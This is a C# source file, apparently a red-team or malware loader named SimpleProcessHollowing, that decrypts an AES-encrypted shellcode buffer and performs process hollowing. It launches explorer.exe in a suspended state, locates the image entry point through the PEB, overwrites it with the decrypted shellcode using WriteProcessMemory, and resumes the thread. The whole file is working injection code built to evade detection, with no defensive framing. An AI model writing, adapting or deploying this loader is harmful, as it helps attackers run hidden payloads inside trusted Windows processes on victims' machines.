using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Permissions;

namespace SimpleProcessHollowing
{
    internal class Program
    {
        #region CreateProc
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        #endregion

        #region NtQueryInfoProc
        private enum PROCESSINFOCLASS
        {
            ProcessBasicInformation = 0x00,
            ProcessQuotaLimits = 0x01,
            ProcessIoCounters = 0x02,
            ProcessVmCounters = 0x03,
            ProcessTimes = 0x04,
            ProcessBasePriority = 0x05,
            ProcessRaisePriority = 0x06,
            ProcessDebugPort = 0x07,
            ProcessExceptionPort = 0x08,
            ProcessAccessToken = 0x09,
            ProcessLdtInformation = 0x0A,
            ProcessLdtSize = 0x0B,
            ProcessDefaultHardErrorMode = 0x0C,
            ProcessIoPortHandlers = 0x0D,
            ProcessPooledUsageAndLimits = 0x0E,
            ProcessWorkingSetWatch = 0x0F,
            ProcessUserModeIOPL = 0x10,
            ProcessEnableAlignmentFaultFixup = 0x11,
            ProcessPriorityClass = 0x12,
            ProcessWx86Information = 0x13,
            ProcessHandleCount = 0x14,
            ProcessAffinityMask = 0x15,
            ProcessPriorityBoost = 0x16,
            ProcessDeviceMap = 0x17,
            ProcessSessionInformation = 0x18,
            ProcessForegroundInformation = 0x19,
            ProcessWow64Information = 0x1A,
            ProcessImageFileName = 0x1B,
            ProcessLUIDDeviceMapsEnabled = 0x1C,
            ProcessBreakOnTermination = 0x1D,
            ProcessDebugObjectHandle = 0x1E,
            ProcessDebugFlags = 0x1F,
            ProcessHandleTracing = 0x20,
            ProcessIoPriority = 0x21,
            ProcessExecuteFlags = 0x22,
            ProcessResourceManagement = 0x23,
            ProcessCookie = 0x24,
            ProcessImageInformation = 0x25,
            ProcessCycleTime = 0x26,
            ProcessPagePriority = 0x27,
            ProcessInstrumentationCallback = 0x28,
            ProcessThreadStackAllocation = 0x29,
            ProcessWorkingSetWatchEx = 0x2A,
            ProcessImageFileNameWin32 = 0x2B,
            ProcessImageFileMapping = 0x2C,
            ProcessAffinityUpdateMode = 0x2D,
            ProcessMemoryAllocationMode = 0x2E,
            ProcessGroupInformation = 0x2F,
            ProcessTokenVirtualizationEnabled = 0x30,
            ProcessConsoleHostProcess = 0x31,
            ProcessWindowInformation = 0x32,
            ProcessHandleInformation = 0x33,
            ProcessMitigationPolicy = 0x34,
            ProcessDynamicFunctionTableInformation = 0x35,
            ProcessHandleCheckingMode = 0x36,
            ProcessKeepAliveCount = 0x37,
            ProcessRevokeFileHandles = 0x38,
            ProcessWorkingSetControl = 0x39,
            ProcessHandleTable = 0x3A,
            ProcessCheckStackExtentsMode = 0x3B,
            ProcessCommandLineInformation = 0x3C,
            ProcessProtectionInformation = 0x3D,
            ProcessMemoryExhaustion = 0x3E,
            ProcessFaultInformation = 0x3F,
            ProcessTelemetryIdInformation = 0x40,
            ProcessCommitReleaseInformation = 0x41,
            ProcessDefaultCpuSetsInformation = 0x42,
            ProcessAllowedCpuSetsInformation = 0x43,
            ProcessSubsystemProcess = 0x44,
            ProcessJobMemoryInformation = 0x45,
            ProcessInPrivate = 0x46,
            ProcessRaiseUMExceptionOnInvalidHandleClose = 0x47,
            ProcessIumChallengeResponse = 0x48,
            ProcessChildProcessInformation = 0x49,
            ProcessHighGraphicsPriorityInformation = 0x4A,
            ProcessSubsystemInformation = 0x4B,
            ProcessEnergyValues = 0x4C,
            ProcessActivityThrottleState = 0x4D,
            ProcessActivityThrottlePolicy = 0x4E,
            ProcessWin32kSyscallFilterInformation = 0x4F,
            ProcessDisableSystemAllowedCpuSets = 0x50,
            ProcessWakeInformation = 0x51,
            ProcessEnergyTrackingState = 0x52,
            ProcessManageWritesToExecutableMemory = 0x53,
            ProcessCaptureTrustletLiveDump = 0x54,
            ProcessTelemetryCoverage = 0x55,
            ProcessEnclaveInformation = 0x56,
            ProcessEnableReadWriteVmLogging = 0x57,
            ProcessUptimeInformation = 0x58,
            ProcessImageSection = 0x59,
            ProcessDebugAuthInformation = 0x5A,
            ProcessSystemResourceManagement = 0x5B,
            ProcessSequenceNumber = 0x5C,
            ProcessLoaderDetour = 0x5D,
            ProcessSecurityDomainInformation = 0x5E,
            ProcessCombineSecurityDomainsInformation = 0x5F,
            ProcessEnableLogging = 0x60,
            ProcessLeapSecondInformation = 0x61,
            ProcessFiberShadowStackAllocation = 0x62,
            ProcessFreeFiberShadowStackAllocation = 0x63,
            MaxProcessInfoClass = 0x64
        };

        private struct PROCESS_BASIC_INFORMATION
        {
            public uint ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }
        #endregion

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("NTDLL.DLL", SetLastError = true)]
        static extern int NtQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS pic, out PROCESS_BASIC_INFORMATION pbi, int processInformationLength, out int returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public const uint cr_susp = 0x00000004;

        static void Main(string[] args)
        {
            byte[] Key = Convert.FromBase64String("UWvdzxNvawefjcAUkEQHeq==");
            byte[] IV = Convert.FromBase64String("WUcLtUFSRczMSaEHrdBBRD==");

            byte[] testy = new byte[] { };
            byte[] chelly = AESDecrypt(testy, Key, IV);

            //Variables for the creation of the process
            //ProcName
            string procName = @"C:\Windows\explorer.exe";

            //StartInfo
            STARTUPINFO si = new STARTUPINFO();

            //ProcessInfo
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            //Security Attributes
            SECURITY_ATTRIBUTES secProc = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES secTh = new SECURITY_ATTRIBUTES();

            //Process creation
            CreateProcess(null, procName, ref secProc, ref secTh, false, cr_susp, IntPtr.Zero, null, ref si, out pi);

            //Variables for consulting process information
            IntPtr proHand = pi.hProcess;

            //Process_Basic_Information
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            //ProcessInfoClass
            PROCESSINFOCLASS pic = new PROCESSINFOCLASS();

            //ReturnLength
            int returnLength = 0;

            //Get process info to find PEB
            int resy = NtQueryInformationProcess(proHand, pic, out pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out returnLength);

            //Calculate the location of the ImageBaseAddress value
            IntPtr iba = (IntPtr)((Int64)pbi.PebBaseAddress + 0x10);

            //Variables to keep the value of ImageBaseAddress
            byte[] bytesIBA = new byte[8];

            //BytesRead
            IntPtr read;

            //Read 8 bytes from the memory at the PEB location to get the ImageBaseAddress
            bool status =  ReadProcessMemory(proHand, iba, bytesIBA, 8, out read);
            IntPtr procAddBase = (IntPtr)BitConverter.ToInt64(bytesIBA, 0);

            //Variable to store the contents of the memory
            byte[] data = new byte[0x200];

            //Read 512 bytes of memory at the location of the ImageBaseAddress
            bool stat = ReadProcessMemory(proHand, procAddBase, data, data.Length, out read);

            //Get the value of e_lfanew
            uint eloffset = BitConverter.ToUInt32(data, 0x3c);


            //Get the value of optional header
            uint optional = eloffset + 0x28;

            //Get the value of entrypoint_rva
            uint entryp_rva = BitConverter.ToUInt32(data, (int)optional);

            //Get the value of AddressOfEntryPoint
            IntPtr addr = (IntPtr)((UInt64)procAddBase + entryp_rva);

            //Shellcode Copy
            IntPtr outwrite;
            WriteProcessMemory(proHand, addr, chelly, chelly.Length, out outwrite);

            //Resume Thread
            ResumeThread(pi.hThread);


        }

        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecrypt(CEncryptedShell, decryptor);
                }
            }
        }
        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
    }
}
